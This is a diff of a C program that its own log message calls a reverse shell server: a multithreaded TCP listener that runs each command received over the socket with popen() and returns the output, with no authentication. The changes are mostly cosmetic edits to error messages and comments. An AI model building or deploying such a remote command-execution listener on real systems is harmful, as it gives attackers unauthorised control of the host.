@@ -28,7 +28,7 @@ void *client_handler(void *arg)
         num_read = recv(client_sock, command, sizeof(command) - 1, 0);
         if (num_read <= 0)
         {
-            perror("recv failed or connection closed");
+            perror("recv failed or connection closed!");
             break;
         }
         command[num_read] = '\0';
@@ -68,17 +68,18 @@ void *client_handler(void *arg)
             }
             if (send(client_sock, output, strlen(output), 0) < 0)
             {
-                perror("send failed");
+                perror("send failed!");
                 break;
             }
-            continue; // Skip popen() execution, move to next iteration.
+            memset(output, 0, sizeof(output)); // Clear output buffer
+            continue;                          // Skip popen() execution, move to next iteration.
         }
 
         // For other commands, execute them using popen() in the current working directory.
         FILE *fp = popen(command, "r");
         if (fp == NULL)
         {
-            snprintf(output, sizeof(output), "Failed to execute command.\n");
+            snprintf(output, sizeof(output), "Failed to execute command!\n");
         }
         else
         {
@@ -122,7 +123,7 @@ int main()
     // Create the socket
     if ((server_sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
-        perror("socket creation failed");
+        perror("socket creation failed!");
         exit(EXIT_FAILURE);
     }
 
@@ -135,7 +136,7 @@ int main()
     // Bind the socket to the port
     if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
     {
-        perror("bind failed");
+        perror("bind failed!");
         close(server_sock);
         exit(EXIT_FAILURE);
     }
@@ -143,29 +144,30 @@ int main()
     // Listen for incoming connections
     if (listen(server_sock, 5) < 0)
     {
-        perror("listen failed");
+        perror("listen failed!");
         close(server_sock);
         exit(EXIT_FAILURE);
     }
 
-    printf("Reverse shell server listening on port %d...\n", PORT);
+    printf("Reverse shell server listening...\n");
 
-    // Main loop: accept incoming connections and spawn a thread for each
+    // Main loop: accept incoming connections
     while (1)
     {
         int *client_sock = malloc(sizeof(int));
         if ((*client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &client_addr_len)) < 0)
         {
-            perror("accept failed");
+            perror("accept failed!");
             free(client_sock);
             continue;
         }
         printf("Connection accepted from %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
 
+        // Create a new thread for the client
         pthread_t tid;
         if (pthread_create(&tid, NULL, client_handler, client_sock) != 0)
         {
-            perror("Failed to create thread");
+            perror("failed to create thread!");
             close(*client_sock);
             free(client_sock);
             continue;
